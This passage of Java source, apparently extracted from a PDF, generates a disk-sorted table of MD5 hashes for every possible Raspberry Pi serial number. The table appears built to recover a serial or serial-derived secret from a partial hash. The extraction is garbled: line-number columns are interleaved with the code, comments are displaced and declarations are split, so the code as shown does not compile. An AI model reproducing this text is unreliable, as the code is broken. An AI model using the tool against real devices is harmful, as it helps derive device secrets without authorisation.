= "00000000"; // the last 8 hex chars of the raspberry pi serial number
= "ffffffff"; // will loop all possible serial numbers from "start" through "end"

// prints a status message during merging every time "a multiple

AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK = 2; // amount of "rotating" input buffers per block
// amount of "rotating" output buffers in total
AMOUNT_OF_OUTPUT_BUFFERS = 2;
// amount of "base" threads
AMOUNT_OF_THREADS = 5;
BYTES_IN_QUEUES
// max amount of bytes in comparison queue (1/2 in
"pre-procesing" and 1/2 in finished). Program is disk IO limited so this value doesn’t matter
that much
BYTES_PER_BLOCK
ByteBuffer max size of Integer.MAX_VALUE
BYTES_IN_BUFFERS = 5000 * (long)Math.pow(10, 6); // MB, will be divided by amount of blocks,
amount of buffers and 2 (1/2 output buffers and 1/2 input buffers)

= Integer.MAX_VALUE; // ˜size of every block. TODO: fix to not be limited by

= 1000000;

// floor to multiples of HASH_LENGTH
BYTES_IN_QUEUES = (long)(HASH_LENGTH * (Math.floor (BYTES_IN_QUEUES / HASH_LENGTH)));
BYTES_PER_BLOCK = (long)(HASH_LENGTH * (Math.floor (BYTES_PER_BLOCK / HASH_LENGTH)));
BYTES_IN_BUFFERS = (long)(HASH_LENGTH * (Math.floor (BYTES_IN_BUFFERS / HASH_LENGTH)));

AMOUNT_OF_HASHES = Long.parseLong(end, 16) - Long.parseLong(start, 16) + 1;
AMOUNT_OF_BLOCKS = (long)Math.ceil((AMOUNT_OF_HASHES * HASH_LENGTH) / BYTES_PER_BLOCK) + 1;

if (BYTES_PER_BLOCK / HASH_LENGTH < AMOUNT_OF_THREADS)

throw new Exception("BYTES_PER_BLOCK / HASH_LENGTH < AMOUNT_OF_THREADS");

if (BYTES_PER_BLOCK > Integer.MAX_VALUE)

throw new Exception("BYTES_PER_BLOCK > Integer.MAX_VALUE");

if (AMOUNT_OF_THREADS > AMOUNT_OF_BLOCKS)

throw new Exception("AMOUNT_OF_THREADS > totalAmountOfBlocks");

if (BYTES_IN_BUFFERS / (2 * AMOUNT_OF_BLOCKS * AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK) >
Integer.MAX_VALUE)

throw new Exception("BYTES_IN_BUFFERS / (2 * totalAmountOfBlocks *
AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK) > Integer.MAX_VALUE");

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33

34
35
36
37

38
39
40
41
42

43

44

45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63

64

65
66
67
68
69
70
71
72
73
74
75
76
77
78
79

80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95

96
97
98

99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120

121
122
123
124
125
126
127
128
129
130
131
132
133
134
135

if (BYTES_IN_BUFFERS / (2 * AMOUNT_OF_OUTPUT_BUFFERS) > Integer.MAX_VALUE)

throw new Exception("BYTES_IN_BUFFERS / (2 * AMOUNT_OF_OUTPUT_BUFFERS) > Integer.MAX_VALUE");

long startTime = System.nanoTime();
long totalTime = startTime;

/*

STEP 1
Create blocks. Every block will contain hashesPerBlock hashes.
The blocks will be sorted and written to disk in files "PATH + blockId"

*/
ArrayList<Block> blocks = createBlocks(Long.parseLong(start, 16), Long.parseLong(end, 16));

System.out.println("--- Done creating " + AMOUNT_OF_BLOCKS + " blocks. " +
getTimeMinutes(startTime) + " mins elapsed. Starting " + AMOUNT_OF_BLOCKS + "-way merge. ---\n");

startTime = System.nanoTime();

/*

STEP 2
Merges the blocks into one single sorted file "PATH"
Removes hashes from disk as soon as they have been read into ram, no backup.

*/
mergeBlocks(blocks);

System.out.println("\n--- Done merging. " + getTimeMinutes(startTime) + " mins elapsed. ---");

System.out.println("\nEverything done:");
System.out.printf("%-20s: %s minutes\n", "Total time elapsed", getTimeMinutes(totalTime));
System.out.printf("%-20s: %s\n", "Amount of hashes", AMOUNT_OF_HASHES);
System.out.printf("%-20s: ˜%.2f GB\n", "Size on disk", (AMOUNT_OF_HASHES * HASH_LENGTH) /
java.lang.Math.pow(10, 9));

}

static ArrayList<Block> createBlocks(long start, long end) throws NoSuchAlgorithmException,
InterruptedException, Exception {

ArrayList<Thread> threads = new ArrayList<Thread>();
ArrayList<Block> blocks = new ArrayList<Block>();

long hashesPerBlock = BYTES_PER_BLOCK / HASH_LENGTH;
long startTime;
long currentStart = end+1;
long currentEnd;

// one block per while loop
Block currentBlock;
int currentBlockId = 0;
while (currentStart > start) {

currentEnd = currentStart - 1;
currentStart -= (hashesPerBlock);

// if (true): last iteration, prevent "overflow"
if (currentStart < start)
currentStart = start;

currentBlock = new Block(currentStart, currentEnd, currentBlockId);

System.out.println("Block " + (currentBlockId) + ": " + currentStart + " through " +
currentEnd + "");
System.out.print(" Creating hashes.");
startTime = System.nanoTime();
currentBlock.createHashes(); // generate hashes
System.out.print(" Done, " + getTimeSeconds(startTime) + " sec.\n");

System.out.print(" Sorting hashes.");
startTime = System.nanoTime();
currentBlock.sort();
System.out.print(" Done, " + getTimeSeconds(startTime) + " sec.\n");

// sort hashes

System.out.println(" Writing hashes to file.\n");
// write hashes to file in a new thread
final Block threadCurrentBlock = currentBlock;
threads.add(

new Thread() {

136
137
138
139
140
141
142
143
144
145
146
147
148
149

150

151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199

200
201
202
203
204
205
206
207

@Override
public void run() {

try {

threadCurrentBlock.writeToFile();
threadCurrentBlock.clearHashes();

// write hashes to file
// and then remove them from ram

} catch(Exception e) {

e.printStackTrace();

}

}

}

);
threads.get(currentBlockId).start();

// if memory allows: start creating new hashes, else: wait until hashes have been written to
disk and cleared from ram before continuing
if (Runtime.getRuntime().freeMemory() < BYTES_PER_BLOCK + BYTES_PER_BLOCK / 2) // arbitrary
value

threads.get(currentBlockId).join();

// add this block to the list of blocks
blocks.add(currentBlock);
currentBlockId++;

}

// wait for all threads to write to file before continuing
for (Thread thread : threads)

thread.join();

// all blocks created, sorted and written to disk
return blocks;

}

// Merges the blocks from disk into one sorted file with a k-way merge
static void mergeBlocks(ArrayList<Block> blocks) throws FileNotFoundException, Exception {

new KWayMergeSort(blocks).merge();

}

static String getTimeMinutes(long startTime) {

return String.format("%.2f", ((System.nanoTime() - startTime)*1.6)/(Math.pow(10,11)));

}

static String getTimeSeconds(long startTime) {

return String.format("%.2f", (System.nanoTime() - startTime)/Math.pow(10,9));

}

}

class Block {

private final long start;
private final long end;
private final int blockId;
private final String path;
private ByteBuffer hashes;
private ReverseBufferedFileReader reader;

// store as bytes to speed up disk IO

Block(long start, long end, int blockId) {

this.start = start;
this.end = end;
this.blockId = blockId;
this.path = CreateSortedWordlist.PATH + this.blockId;

}

/*

Produces hashes and puts them into the this.hashes buffer

*/
void createHashes() throws NoSuchAlgorithmException, InterruptedException {

this.hashes = ByteBuffer.allocate(((int)(this.end - this.start) + 1) *
CreateSortedWordlist.HASH_LENGTH);

// threadRange ˜= how many hashes each thread should produce
int threadRange = (int)(this.end - this.start + 1) / CreateSortedWordlist.AMOUNT_OF_THREADS;
CreateHashesThread[] threads = new CreateHashesThread[CreateSortedWordlist.AMOUNT_OF_THREADS];

// if more threads than hashes to create, only spawn enouch threads to let them take one each
if (this.end - this.start + 1 < CreateSortedWordlist.AMOUNT_OF_THREADS) {

threads = new CreateHashesThread[(int)(this.end - this.start + 1)];

208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241

242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281

threadRange = 1;

}

long currentStart;
long currentEnd;

// create threads and send them to work
for (int i = 0; i < threads.length; i++) {

currentStart = this.start + i * (threadRange);
currentEnd = this.start + ((i+1) * (threadRange)) - 1;

// if (true): this it the last thread, take rest of hashes
if (i == (threads.length - 1))
currentEnd = this.end;

threads[i] = new CreateHashesThread(currentStart, currentEnd, this.hashes, this.start);
threads[i].start();

}

// wait for all threads to finish before continuing
for (CreateHashesThread thread : threads)

thread.join();

}

/*

Sorts this.hashes buffer

*/
void sort() throws Exception {

if (this.hashes == null)

throw new Exception("this.hashes == null. Probably haven’t used block.createHashes() yet.");

// multithreaded recursive quicksort, use pool to make sure not to may threads are spawned
ForkJoinPool pool = new ForkJoinPool(CreateSortedWordlist.AMOUNT_OF_THREADS);
pool.invoke(new QuickSort(this.hashes, 0, (this.hashes.capacity() /
CreateSortedWordlist.HASH_LENGTH) - 1));

}

/*

Writes this.hashes buffer to file "this.path"

*/
void writeToFile() throws Exception {

this.hashes.position(this.hashes.capacity());
this.hashes.flip();

FileOutputStream fos = new FileOutputStream(this.path);
fos.getChannel().write(this.hashes);
fos.close();

}

void clearHashes() {

this.hashes = null;

}

void initKWayMerge() throws FileNotFoundException {

this.reader = new ReverseBufferedFileReader(this.path);

}

byte[] pop() throws InterruptedException {

return this.reader.pop();

}

byte[] peek() throws InterruptedException {

return this.reader.peek();

}

}

/*

Generates hashes and writes them to this.hashes

*/
class CreateHashesThread extends Thread {

private final long start;
private final long end;
private final long blockStart;
private final ByteBuffer hashes;
private final MessageDigest md;

282
283
284
285

286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307

308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329

330
331
332
333
334
335
336
337
338
339
340
341

342
343
344
345
346
347
348
349
350
351

private String currentNumberHexString;
private String currentNumberHexStringFormatted;

CreateHashesThread(long threadStart, long threadEnd, ByteBuffer hashes, long blockStart) throws
NoSuchAlgorithmException {

this.start = threadStart;
this.end = threadEnd;
this.hashes = hashes;
this.md = MessageDigest.getInstance("MD5");
this.blockStart = blockStart;

}

@Override
public void run() {

long currentNumber = this.start;
BigInteger currentHashBigInteger;
byte[] currentHashBytes;
byte[] tempSwap;

// creates hashes and adds to list in this.hashes given by parent
while (currentNumber <= end) {

try {

currentHashBigInteger = createHash(currentNumber);
currentHashBytes = currentHashBigInteger.toByteArray();

// .toByteArray() on BigInteger includes sign bit and removes padded zeros
// if (length > CreateSortedWordlist.ROW_LENGTH): remove the first byte (contains the
sign bit)
// if (length < CreateSortedWordlist.ROW_LENGTH): pad with zeros until correct length
// if (length == CreateSortedWordlist.ROW_LENGTH): do nothing, already correct
if (currentHashBytes.length > CreateSortedWordlist.HASH_LENGTH) {

tempSwap = new byte[CreateSortedWordlist.HASH_LENGTH];
for (int i = 0; i < CreateSortedWordlist.HASH_LENGTH; i++)

tempSwap[i] = currentHashBytes[i+1];

currentHashBytes = tempSwap;

} else if (currentHashBytes.length < CreateSortedWordlist.HASH_LENGTH) {

tempSwap = new byte[CreateSortedWordlist.HASH_LENGTH];
int i;
for (i = 0; i < CreateSortedWordlist.HASH_LENGTH - currentHashBytes.length; i++)

tempSwap[i] = 0;

for (int j = 0; i < CreateSortedWordlist.HASH_LENGTH; i++, j++)

tempSwap[i] = currentHashBytes[j];

currentHashBytes = tempSwap;

}

for (int i = 0; i < CreateSortedWordlist.HASH_LENGTH; i++)

this.hashes.put((int)(((currentNumber - this.blockStart) *
CreateSortedWordlist.HASH_LENGTH) + i), currentHashBytes[i]); // using put() with
index makes it threadsafe

currentNumber++;
} catch (Exception e) {

e.printStackTrace();

}

}

}

private BigInteger createHash(long currentNumber) throws UnsupportedEncodingException {

// create serial number from long
this.currentNumberHexString = Long.toHexString(currentNumber);
this.currentNumberHexStringFormatted = padZeros(16, this.currentNumberHexString) + "\n"; //
"ECHO"-COMMAND ADDS A NEW LINE CHAR

// create md5 hash from serial number
return new BigInteger(1, this.md.digest(this.currentNumberHexStringFormatted.getBytes("UTF-8")));

}

private String padZeros(int length, String hexString) {

StringBuilder sb = new StringBuilder();
for (int j = 0; j < length-hexString.length(); j++)

sb.append(’0’);

352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386

387

388
389

390
391
392
393
394
395
396

397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421

}

/*

return sb.toString() + hexString;

}

Quick sort on the given bytebuffer.
Every item is HASH_LENGTH bytes.
Uses the last element as pivot.
Assumes no items are equal.
Descending order.

*/
class QuickSort extends RecursiveAction {
private final ByteBuffer hashes;
private final int insertionSortThreshold;
private final int start;
private final int end;

QuickSort(ByteBuffer hashes, int start, int end) {

// cutoff to switch over to insertion sort

this.insertionSortThreshold = 8;
this.hashes = hashes;
this.start = start;
this.end = end;

}

@Override
protected void compute() {

if (this.end - this.start <= this.insertionSortThreshold) {

insertionSort(this.start, this.end);
return;

}

int pivotPointer = this.end * CreateSortedWordlist.HASH_LENGTH;
int largerThanPivotPointer = (this.start - 1) * CreateSortedWordlist.HASH_LENGTH;

// iterates from left to right (low to high) swapping any hashes larger than pivot to the left
(low)
for (int currentPointer = this.start * CreateSortedWordlist.HASH_LENGTH; currentPointer <
this.end * CreateSortedWordlist.HASH_LENGTH; currentPointer += CreateSortedWordlist.HASH_LENGTH)

if (Util.compare(currentPointer, pivotPointer, this.hashes) > 0)

swap(currentPointer, largerThanPivotPointer += CreateSortedWordlist.HASH_LENGTH,
this.hashes);

// done, swap pivot into correct position
swap(largerThanPivotPointer += CreateSortedWordlist.HASH_LENGTH, pivotPointer, this.hashes);
pivotPointer = largerThanPivotPointer;

// pivot in its correct position, sort left and right (ForkJoinPool function)
invokeAll(new QuickSort(this.hashes, this.start, (pivotPointer /
CreateSortedWordlist.HASH_LENGTH) - 1), new QuickSort(this.hashes, (pivotPointer /
CreateSortedWordlist.HASH_LENGTH) + 1, this.end));

}

void insertionSort(int start, int end) {

if (start == end)

// if (true): insertionsort cutoff set to 0, no insertion sort needed

return;

int j, jIndex, jMinusOneIndex;
for (int i = 1; i < (end - start + 1); i++) {

j = i + start;
while (j > 0) {

jIndex = j * CreateSortedWordlist.HASH_LENGTH;
jMinusOneIndex = (j-1) * CreateSortedWordlist.HASH_LENGTH;

// descending order
if (Util.compare(jIndex, jMinusOneIndex, this.hashes) > 0)

swap(jIndex, jMinusOneIndex, this.hashes);

else

break;

j--;

}

}

}

void swap(int left, int right, ByteBuffer buffer) {

ByteBuffer tempSwap = ByteBuffer.allocate(CreateSortedWordlist.HASH_LENGTH);

for (int i = 0; i < CreateSortedWordlist.HASH_LENGTH; i++) {

tempSwap.put(i, buffer.get(left+i));
buffer.put(left+i, buffer.get(right+i));
buffer.put(right+i, tempSwap.get(i));

// move a to temp
// move b to a
// move temp to b

}

}

}

/*

Merges the blocks stored on disk into one single sorted file

*/
class KWayMergeSort {

private final ArrayList<Block> blocks;
private final long startTime;

KWayMergeSort(ArrayList<Block> blocks) throws FileNotFoundException {

this.blocks = blocks;
this.startTime = System.nanoTime();

// Creates ReverseBufferedFileReader for blocks
for (Block block : blocks)
block.initKWayMerge();

}

void merge() throws IOException, Exception
{

BufferedFileChannel outputChannel = new BufferedFileChannel(CreateSortedWordlist.PATH);

// comparisonHandler does all comparisons, "this" thread only fetches results from the
comparisonHandler
KWayComparisonHandler comparisonHandler = new KWayComparisonHandler(this.blocks);
comparisonHandler.init();
comparisonHandler.start();

long countIterations = 0;
byte[] minBlock;

// remove smallest item from the blocks found by comparisonHandler and write result to
outputChannel
// getMin() returns byte[].length != 16 when all hashes have been merged (BlockingQueue doesn’t
allow null)
while(true) {

minBlock = comparisonHandler.getMin();
if (minBlock.length != 16)

break;

outputChannel.write(minBlock);

// print status message
if (countIterations++ % CreateSortedWordlist.STATUS_MESSAGE == 0)

System.out.printf("%-22s%-30s\n", CreateSortedWordlist.getTimeMinutes(this.startTime) +
" mins elapsed", countIterations + " hashes sorted.");

}

// done. stop comparisonHandler and write remaining data in outputWriter buffer to file
comparisonHandler.kill();
outputChannel.writeRest();

}

}

/*

Does all comparisons during the k-way merge.
Creates subthreads that does comparison and finds the currently smallest hash from the blocks.

*/
class KWayComparisonHandler extends Thread {

private final ArrayBlockingQueue<byte[]> resultComparesBuffer;
comparison results that can be fetched from the main thread
private final ArrayBlockingQueue<ComparisonDTO>[] pendingComparesBuffer; // contains comparisons
done by the threads that is to be proccessed by this handler
private final PriorityQueue<ComparisonDTO> handlerPriorityQueue;
the current smallest items from every threads
private final Object monitorStop;
private final ArrayList<Thread> threads;
private final ArrayList<Block> blocks;

// contains complete

// priority queue to store

422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450

451
452
453
454
455
456
457
458

459

460
461
462
463
464
465
466
467
468
469

470
471
472
473
474
475
476
477
478
479
480
481
482
483

484

485

486
487
488
489

490
491
492
493
494
495

496
497

498
499
500
501

502
503
504
505
506

507
508
509
510
511
512
513
514
515
516
517
518
519
520
521
522
523
524
525
526
527
528
529

530
531

532
533
534
535
536
537
538
539
540
541
542
543
544
545
546
547
548
549
550
551

552
553
554
555

KWayComparisonHandler(ArrayList<Block> blocks) {

this.blocks = blocks;
this.threads = new ArrayList<Thread>();
this.monitorStop = new Object();

this.resultComparesBuffer = new
ArrayBlockingQueue<byte[]>((int)CreateSortedWordlist.BYTES_IN_QUEUES / (2 *
CreateSortedWordlist.HASH_LENGTH));
this.pendingComparesBuffer = new ArrayBlockingQueue[CreateSortedWordlist.AMOUNT_OF_THREADS];
this.handlerPriorityQueue = new
PriorityQueue<ComparisonDTO>(CreateSortedWordlist.AMOUNT_OF_THREADS);

}

void init() {

int threadRange = this.blocks.size() / CreateSortedWordlist.AMOUNT_OF_THREADS; // ˜range of
blocks that every thread will take

// Create threads that does comparisons
for(int i = 0; i < CreateSortedWordlist.AMOUNT_OF_THREADS; i++) {

// every thread has its own buffer that it writes its comparison results to
this.pendingComparesBuffer[i] = new
ArrayBlockingQueue<ComparisonDTO>((int)CreateSortedWordlist.BYTES_IN_QUEUES / (2 *
CreateSortedWordlist.AMOUNT_OF_THREADS * CreateSortedWordlist.HASH_LENGTH));

int currentEnd = (i+1) * threadRange - 1;
// last iteration, let this thread take the rest
if (i >= CreateSortedWordlist.AMOUNT_OF_THREADS - 1)

currentEnd = this.blocks.size() - 1;

final int finalCurrentStart = i * threadRange;
final int finalCurrentEnd
final int threadI = i;

= currentEnd;

// start block
// end block

// create thread that will do comparisons on blocks startBlock through endBlock
this.threads.add(
new Thread(){

private final int startBlock = finalCurrentStart;
private final int endBlock
private final int threadId
private ComparisonDTO minBlock;

= finalCurrentEnd;
= threadI;

@Override
public void run() {

try {

while(true) {

// find min from blocks startBlock through endBlock and add to buffer
(this threads buffer)
this.minBlock = findMinHash();
KWayComparisonHandler.this.pendingComparesBuffer[this.threadId].put(
this.minBlock);

// if (true): no more hashes to compare from blocks, end execution
if (this.minBlock.getHash() == null)

break;

}

} catch (InterruptedException e) {

e.printStackTrace();

}

}

// find minimum hash from the given block range
private ComparisonDTO findMinHash() throws InterruptedException {

int minBlockIndex = -1;
byte[] min = null;
byte[] currentBlockMin;

for (int blockId = this.startBlock; blockId <= this.endBlock; blockId++) {

currentBlockMin = KWayComparisonHandler.this.blocks.get(blockId).peek();

if (currentBlockMin != null) {
"blockId"

// if (null): no more hashes in block

if (min == null || Util.compare(currentBlockMin, min) < 0) {

min = currentBlockMin;
minBlockIndex = blockId;

}

556
557
558
559

560
561
562
563
564

565
566
567
568
569
570
571
572
573
574
575
576
577
578
579
580
581
582
583
584
585
586
587
588
589
590
591
592
593
594
595
596
597
598
599
600
601
602

603

604
605
606
607
608
609
610
611
612
613
614
615
616
617
618
619
620
621
622
623
624
625
626

}

}

// hash will be set to null in ComparisonDTO if no more hashes to merge from
this block range
if (min == null)

return new ComparisonDTO(this.threadId, null);

// removes and returns the smallest item from the blocks
return new ComparisonDTO(this.threadId,
KWayComparisonHandler.this.blocks.get(minBlockIndex).pop());

}

}

);

}

}

@Override
public void run() {

try {

// start the comparison threads
for(Thread thread : threads)

thread.start();

// populate the priority queue with minimums from threads
for (int threadId = 0; threadId < this.threads.size(); threadId++)

this.handlerPriorityQueue.add(this.pendingComparesBuffer[threadId].take());

ComparisonDTO current, next;

while(true) {

// queue empty, done
if (this.handlerPriorityQueue.isEmpty())

break;

// remove min from priority queue. Get next min from same thread (i.e. same block range)
current = this.handlerPriorityQueue.poll();
next = this.pendingComparesBuffer[current.getthreadId()].take();

// if next == null: this thread is done, dont add next to priority queue
if (next.getHash() != null)

this.handlerPriorityQueue.add(next);

// add result to resultBuffer which will be retreived from the main thread
this.resultComparesBuffer.put(current.getHash());

}

synchronized(this.monitorStop) {

this.resultComparesBuffer.put(new byte[] {(byte)0});
doesn’t allow null, so use byte[].length != 16 as indicator
this.monitorStop.wait(); // the main thread will fetch all remaining hashes in the
result queue and then notify on this.monitorStop to kill this thread

// done executing, BlockingQueue

}

} catch (InterruptedException e) {

e.printStackTrace();

}

}

byte[] getMin() throws InterruptedException {

return this.resultComparesBuffer.take();

}

void kill() {

synchronized(this.monitorStop) {

this.monitorStop.notify();

}

}

}

/*

DTO for comparison results

*/
class ComparisonDTO implements Comparable {

private final int threadId;
private final byte[] hash;

627
628
629
630
631
632
633
634
635
636
637
638
639
640
641
642
643

644
645
646
647
648
649
650
651
652
653
654
655
656
657
658
659
660
661
662
663
664
665
666
667
668
669
670
671
672
673
674
675
676
677
678
679
680
681
682
683
684
685
686
687
688
689
690
691
692
693
694
695
696
697
698
699
700

ComparisonDTO(int threadId, byte[] hash) {

this.threadId = threadId;
this.hash = hash;

}

@Override
public int compareTo(Object o) {

return Util.compare(this.getHash(), ((ComparisonDTO)o).getHash());

}

byte[] getHash() { return this.hash; }
int getthreadId() { return this.threadId; }

}

class Util {

static final int START_COMPARE_INDEX = 10;
(when HASH_LENGTH == 16)
static final int AMOUNT_OF_BYTES_TO_COMPARE = 6;

// last 12 hex chars starts at byte index 10

// 12 hex chars = 6 bytes

// compare used during quicksort
static int compare(int leftPointer, int rightPointer, ByteBuffer buffer) {

short leftUnsigned;
short rightUnsigned;

for (int i = 0; i < AMOUNT_OF_BYTES_TO_COMPARE; i++) {

// convert to short before comparing since the sign of bytes ruins comparisons
leftUnsigned = (short)(buffer.get(leftPointer + START_COMPARE_INDEX+i) & 0xff);
rightUnsigned = (short)(buffer.get(rightPointer + START_COMPARE_INDEX+i) & 0xff);

if (leftUnsigned < rightUnsigned)

return -1;

else if (leftUnsigned > rightUnsigned)

return 1;

}
// looped through all bytes, they are equal
return 0;

}

// compare used during k-way merge
static int compare(byte[] left, byte[] right) {

// count null as greater than
if (right == null)
return -1;

// will be true if both are null

else if (left == null)

return 1;

short leftUnsigned;
short rightUnsigned;

for (int i = 0; i < AMOUNT_OF_BYTES_TO_COMPARE; i++) {

// convert to short before comparing since the sign of bytes ruins comparisons
leftUnsigned = (short)(left[START_COMPARE_INDEX+i] & 0xff);
rightUnsigned = (short)(right[START_COMPARE_INDEX+i] & 0xff);
if (leftUnsigned < rightUnsigned)

return -1;

else if (leftUnsigned > rightUnsigned)

return 1;

}
// looped through all bytes, they are equal
return 0;

}

}

/*

Buffers hashes in ByteBuffer before writing to FileChannel

*/
class BufferedFileChannel {

private final ByteBuffer[] buffer;
private final RandomAccessFile raf;
private final boolean bufferAvailable[];
private final Object rafLock;
private final Object bufferAvailableMonitor;
private int currentBuffer;

701
702
703
704

705

706
707
708
709
710

711
712
713
714
715
716
717
718
719
720
721
722
723
724
725
726
727
728
729
730
731
732
733
734
735
736
737
738
739
740
741
742
743
744

745
746
747
748
749
750
751
752
753
754
755
756
757
758
759
760
761
762
763
764
765
766
767
768
769
770
771

BufferedFileChannel(String path) throws FileNotFoundException, FileNotFoundException {

// use multiple buffers to allow for writing to file and adding new items at the same time
// floor bufferSize to multiple of HASH_LENGTH
int bufferSize = (int)(CreateSortedWordlist.BYTES_IN_BUFFERS / (2 *
CreateSortedWordlist.AMOUNT_OF_OUTPUT_BUFFERS));
bufferSize = (int)(CreateSortedWordlist.HASH_LENGTH * (Math.floor (bufferSize /
CreateSortedWordlist.HASH_LENGTH)));

this.buffer = new ByteBuffer[CreateSortedWordlist.AMOUNT_OF_OUTPUT_BUFFERS];
this.bufferAvailable = new boolean[CreateSortedWordlist.AMOUNT_OF_OUTPUT_BUFFERS];

this.currentBuffer = 0; // index of the buffer that is currently being written to from the main
thread
// init buffers
for (int i = 0; i < CreateSortedWordlist.AMOUNT_OF_OUTPUT_BUFFERS; i++) {

this.buffer[i] = ByteBuffer.allocate(bufferSize);
this.bufferAvailable[i] = true;

}

this.raf = new RandomAccessFile(path, "rw");
this.rafLock = new Object();
this.bufferAvailableMonitor = new Object();

}

private void writeBufferToFile(int currentBuffer) {

try {

// lock file on disk and write buffer to it
synchronized(this.rafLock) {

this.raf.seek(this.raf.length());
this.buffer[currentBuffer].flip();
this.raf.getChannel().write(this.buffer[currentBuffer]);

}

// writing done, clear the buffer, set to availabe and notify if someone is waiting
synchronized(this.bufferAvailableMonitor) {
this.buffer[currentBuffer].clear();
this.buffer[currentBuffer].limit(this.buffer[currentBuffer].capacity());
this.bufferAvailable[currentBuffer] = true;
this.bufferAvailableMonitor.notify();

}

} catch(IOException e) {
e.printStackTrace();

}

}

void write(byte[] output) throws InterruptedException {

// the current buffer is empty, change to new buffer and send thread to write current buffer to
file
if (this.buffer[this.currentBuffer].position() >= this.buffer[this.currentBuffer].capacity()) {

this.bufferAvailable[this.currentBuffer] = false;

int threadCurrentBuffer = this.currentBuffer;
// create new thread to write hashes to file
// TODO: use a pool of threads instead of creating new ones?
// TODO: some sort of queue system since writes to file can become out of order
new Thread() {

@Override
public void run(){

writeBufferToFile(threadCurrentBuffer);

}

}.start();

// goto next buffer, loop around to zero if needed
if (++this.currentBuffer >= CreateSortedWordlist.AMOUNT_OF_OUTPUT_BUFFERS)

this.currentBuffer = 0;

// wait if the next buffer isn’t ready to be used
synchronized(this.bufferAvailableMonitor) {

while (this.bufferAvailable[this.currentBuffer] == false)

this.bufferAvailableMonitor.wait();

}

}

// add hash to buffer
this.buffer[this.currentBuffer].put(output);

772
773
774
775
776
777
778
779
780
781
782
783
784
785
786

787
788
789

790
791
792
793
794
795
796
797
798
799
800
801
802

803

804
805
806
807
808

809
810
811
812
813
814

815
816
817
818
819
820
821
822
823
824
825
826
827
828
829
830
831
832
833
834
835
836
837
838
839
840

}

// main thread is done executing, write rest of buffered data to file
void writeRest() throws IOException {

// lock file on disk and write buffer to it
synchronized(this.rafLock) {

this.raf.seek(this.raf.length());
this.buffer[this.currentBuffer].flip();
this.raf.getChannel().write(this.buffer[this.currentBuffer]);

}

}

}

/*

Reads and buffers file in reverse (since blocks are sorted in descending order to allow removing of
hashes from disk after they have been read into ram)

*/
class ReverseBufferedFileReader {

private final ByteBuffer buffer[]; // only certain operations thread safe (ex. functions specifying
indexes)
private final boolean bufferAvailable[];
private final Object bufferAvailableMonitor;
private final Object rafLock;
private final String path;
private RandomAccessFile raf;
private boolean noMoreHashesOnDisk;
private int currentBuffer;
private int bufferSize;

ReverseBufferedFileReader(String path) throws FileNotFoundException {

// use multiple buffers to allow for writing to file and adding new items at the same time
// floor bufferSize to multiple of HASH_LENGTH
this.bufferSize = (int)(CreateSortedWordlist.BYTES_IN_BUFFERS / (2 *
CreateSortedWordlist.AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK * CreateSortedWordlist.AMOUNT_OF_BLOCKS));
this.bufferSize = (int)(CreateSortedWordlist.HASH_LENGTH * (Math.floor (this.bufferSize /
CreateSortedWordlist.HASH_LENGTH)));

this.buffer = new ByteBuffer[CreateSortedWordlist.AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK];
this.bufferAvailable = new boolean[CreateSortedWordlist.AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK];

this.noMoreHashesOnDisk = false;
on disk for "this block"
this.path = path;
this.raf = new RandomAccessFile(path, "rw");
this.bufferAvailableMonitor = new Object();
this.rafLock = new Object();

// indicator to see if this reader is done i.e. no more hashes

this.currentBuffer = 0;
thread

// index of the buffer that is currently being written to from the main

// init, fetch hashes from disk
for (int i = 0; i < CreateSortedWordlist.AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK; i++) {

if (!this.noMoreHashesOnDisk) {

this.buffer[i] = ByteBuffer.allocate(this.bufferSize);
fetchHashesFromDisk(i);
this.bufferAvailable[i] = true;

} else {

this.buffer[i] = ByteBuffer.allocate(0);
this.bufferAvailable[i] = false;

}

}

}

private void fetchHashesFromDisk(int currentBuffer) {

long amountOfBytesToRead;

try {

synchronized(this.rafLock) {

// this thread spawned before flag was set. It is now set, so nothing to do
if (this.noMoreHashesOnDisk) {

synchronized(this.bufferAvailableMonitor) {

this.bufferAvailableMonitor.notify();
return;

// notify if someone waits on this thread

}

}

841
842
843
844
845
846
847
848
849
850
851
852
853
854
855
856
857

858
859
860
861
862
863
864
865
866
867
868
869
870
871
872
873
874
875
876
877
878
879
880
881
882
883
884
885
886
887
888
889
890
891
892
893
894
895
896
897
898
899
900
901
902
903
904
905
906
907
908
909
910
911
912
913
914

// if (true): no more hashes in file after this fetch
if (this.raf.length() <= this.bufferSize) {

amountOfBytesToRead = this.raf.length();
synchronized(this.bufferAvailableMonitor) {

this.noMoreHashesOnDisk = true;

}

} else

amountOfBytesToRead = this.bufferSize;

// position pointer correctly and read
this.buffer[currentBuffer].clear();
this.raf.seek(raf.length() - amountOfBytesToRead);
this.raf.getChannel().read(this.buffer[currentBuffer]);

// set position and limit, descending order
this.buffer[currentBuffer].position((int)amountOfBytesToRead -
